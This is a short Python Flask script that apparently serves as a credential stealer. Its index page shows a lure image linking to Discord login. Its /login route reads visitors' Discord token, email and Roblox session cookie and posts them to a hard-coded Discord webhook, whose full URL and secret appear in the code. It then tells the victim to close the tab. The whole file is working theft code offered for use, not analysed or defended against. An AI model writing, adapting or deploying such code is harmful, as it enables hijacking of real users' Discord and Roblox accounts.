from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# Replace with your webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1437519275391975485/kOyKz5U9HTkH11P6T2HE_KXK5dEtapamJF299n2f4TpN3QBY5nLBlWyJNUQ7j9gXKltk"

@app.route("/")
def index():
    return """
        <a href="https://discord.com/login?redirect_to=discord.com">
          <img src="https://upload-os-bbs.hoyolab.com/upload/2023/04/14/323351764/bf2aa186a52f7d5f45d8b54e0808a121_5797701741494440015.jpg" alt="Discord Image" />
        </a>
    """

@app.route("/login", methods=["GET"])
def login():
    try:
        cookies = request.cookies
        discord_token = cookies.get("token")
        email = cookies.get("email")
        roblox_cookie = cookies.get("roblox")

        if not discord_token or not email or not roblox_cookie:
            return jsonify({"error": "Incomplete data"}), 400

        data = {"discord_token": discord_token, "email": email, "roblox_cookie": roblox_cookie}

        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            return "Done! Please close this tab.", 200
        else:
            return jsonify({"error": "Failed to send data to webhook"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port)
